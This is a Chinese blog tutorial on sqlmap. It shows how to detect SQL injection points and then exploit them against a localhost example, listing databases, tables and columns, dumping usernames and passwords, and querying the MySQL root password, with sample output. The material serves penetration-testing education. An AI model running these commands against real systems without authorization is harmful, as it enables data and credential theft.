---
title: 如何使用 sqlmap 进行数据库渗透测试
date: 2024-12-25T14:00:22+08:00
author: LiangMingJian
---

# 概述

**sqlmap 是一个开源的数据库渗透测试工具，它自动化了 sql 检测，注入的过程。**

[ sqlmap官网下载 ](http://sqlmap.org/)

# 安装

```bash
# 解压
tar zxvf sqlmap.tar.gz
# 进入 sqlmap 源码文件夹
cd sqlmap
# 执行 sqlmap python 脚本，需要注意 sqlmap 使用 python2 编写
./sqlmap.py
# 创建 sqlmap 命令
ln -s /root/sqlmapproject-sqlmap-7eab1bc/sqlmap.py /usr/bin/sqlmap
# 帮助命令
sqlmap -h 
```

# sqlmap 的功能

sqlmap 会对传入的 URL 接口进行检测，完成诸如：判断可使用的 sql 注入参数，判断可使用的 sql 注入技术等工作。

同时，在识别到存在 sql 注入漏洞后，sqlmap 还支持自动完成一些如数据库查询，数据读取等攻击工作。

总而言之，**sqlmap 可以帮我们完成 sql 注入的检测工作以及复现工作**。

# 使用 sqlmap 检测漏洞

```bash
# 检测注入点
sqlmap -u "http://127.0.0.1/sqlmap?id=11"
```

当执行上述命令时，sqlmap 会自动的对传入 URL 接口进行检测，针对参数 `id` 检查是否存在注入点。

> 这里的参数 `-u` 指代的就是 `url`。

当 URL 接口传入的参数有多个时，可以通过 `-p` 来指定检测的参数，默认检测全部。

```bash
# 指定参数检测
sqlmap -u "http://127.0.0.1/sqlmap?id=1&num=2" -p "id" 
sqlmap -u "http://127.0.0.1/sqlmap?id=1&num=2" -p "num,id" 
```

如果传入的 URL 接口是使用 POST，PUT 这些其他请求，那么可以通过 `--method "POST" --data "id=1&num=2"` 指定请求方式和参数来进行检测。

```bash
# 指定请求方法和数据 
sqlmap -u "http://127.0.0.1/sqlmap" --method "POST" --data "id=1&num=2" 
```

当传入的 URL 接口需要使用 Cookie 时，可以通过 `--cookie "token=abcdefg; session=xyz123"` 来进行检测。

```bash
# 指定 Cookie
sqlmap -u "http://127.0.0.1/sqlmap?id=1" --cookie "token=abcdefg; session=xyz123"
```

除了上述参数，sqlmap 还提供一些额外的参数，针对不同的 URL 接口进行检测，以及提供更强大的检测功能。

| 参数    | 功能    |
| --- | --- |
|  \*   | 针对路由参数，如 `/sqlmap/1` 中的 `1`，sqlmap 无法自动识别注入点，因此需要通过 \* 号，手动进行标识，如 `/sqlmap/1*`    |
| -v   | 设置输出信息的详细程度，提供 0-6 七个等级，默认 1，显示基本信息和警告信息，如果需要查看已注入的测试参数，可以使用等级 3   |
| --level   | 指定 sqlmap 检测强度，提供 1-5 五个等级，默认 1  |
| --union-check   | 检测目标网站是否支持 ‌UNION 查询注入，提供额外的 sql 注入测试  |
| --technique   | 指定 sqlmap 检测时使用的技术，不使用该参数时默认使用全部技术（BEUSTQ）  |

> sqlmap 检测技术包括：B（布尔型注入，通过接口响应的差异判断注入是否成功）、E（报错型注入，通过触发数据库错误判断注入是否成功）、T（基于时间延迟注入，通过加入延迟函数来判断注入是否成功）、U（联合查询注入，通过 UNION 数据库操作符进行注入）、Q（内联查询注入，通过在 SQL 语句中再嵌套 SQL 语句进行检测）、S（堆叠查询注入，支持执行多条 SQL 语句）。

## 使用 sqlmap 攻击漏洞

当我们通过 sqlmap 检测到 sql 注入漏洞后，便可以对这些漏洞进行“攻击”，获取数据库信息，验证漏洞的危害性。

```bash
sqlmap -u "http://127.0.0.1/sqlmap?id=1" --dbs           # 列出所有可用的数据库
sqlmap -u "http://127.0.0.1/sqlmap?id=1" --current-db    # 列出当前正在连接的数据库
sqlmap -u "http://127.0.0.1/sqlmap?id=1" --users         # 列出数据库中所有用户
sqlmap -u "http://127.0.0.1/sqlmap?id=1" --current-user  # 列出当前连接数据库的用户
```

通过上述命令的执行，我们便可以获取到被攻击数据库的基本信息，如数据库名。

在我们获取到数据库名后，便可以读取这个数据库中的表，进而读取这些数据表中的数据。

```bash
sqlmap -u "http://127.0.0.1/sqlmap?id=1" --tables -D "数据库名"                      # 列出数据库中所有的表
sqlmap -u "http://127.0.0.1/sqlmap?id=1" --columns -T "表名" -D "数据库名"            # 列出数据表中所有的列名
sqlmap -u "http://127.0.0.1/sqlmap?id=1" --dump -C "列名,列名" -T "表名" -D "数据库"    # 获取数据表中的数据
```

这样，我们便完成了一次 sql 注入攻击。

当然，sqlmap 也允许执行用户自定义的 SQL 查询语句，通过 `--sql-query` 指定自定义的攻击语句。

```bash
sqlmap -u "http://127.0.0.1/sqlmap?id=1" --sql-query="SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" 
```

# 操作示例

现有接口 `http://127.0.0.1/sqlmap?id=1`，请检测该接口是否存在 sql 注入漏洞。

## 第一步：查找注入点

执行：`sqlmap -u 'http://127.0.0.1/sqlmap?id=1'`。

检查输出中是否出现 `sqlmap resumed the following injection point(s) from stored session`，若有，则输出内容下方的 `Parameter: id (GET)` 等内容就是注入点。

```bash
.....
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1817=1817

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1 AND SLEEP(5)

---
.....
```

## 第二步：查找数据库名

执行：`sqlmap -u 'http://127.0.0.1/sqlmap?id=1' --dbs'`。

检查输出中是否出现 `available databases [number]`，若有，则输出内容下方的就是可被攻击的数据库名。

> 对于 MySQL，默认会有一个数据库 `information_schema`，用于存储 MySQL 服务器中所有其他数据库的‌元数据信息。

```bash
.....
available databases [2]:                                                       
[*] information_schema
[*] website
.....
# website 是可被攻击的数据库名
```

## 第三步：获取表名

执行：`sqlmap -u 'http://127.0.0.1/sqlmap?id=1' -D website --tables'`。

检查输出中是否出现 `[number tables]`，该内容下使用边框包裹的内容便是目标数据库中所有的数据表名称。

```bash
.....
Database: website                                                              
[2 tables]
+----------+
| users     |
| resources |
+----------+
.....
# users 和 resources 是可被攻击的数据表名
```

## 第四步：获取列名（字段名）

执行：`sqlmap -u 'http://127.0.0.1/sqlmap?id=1' -D website -T users --columns`。

检查输出中是否出现 `[number columns]`，该内容下使用边框包裹的内容就是目标数据表中所有的列名（字段名）。

```bash
......
Database: website                                                              
Table: users
[3 columns]
+----------+-----------+
| Column   | Type    |
+----------+-----------+
| id       | int(10) |
| name     | text    |
| password | text    |
+----------+-----------+
......
# id，name，password 是可被攻击的列名
```

## 第五步：读取数据

执行：`sqlmap -u 'http://127.0.0.1/sqlmap?id=1' -D website -T users -C name,password --dump`。

完成注入攻击，可以在输出中查看到用户名与密码。

```bash
......
Database: website                                                              
Table: users
[3 entries]
+---------+---------+
| name   | password |
+---------+---------+
| test1  |  123456  |
| test2  |  123456  |
| test3  |  123456  |
+---------+---------+
......
```
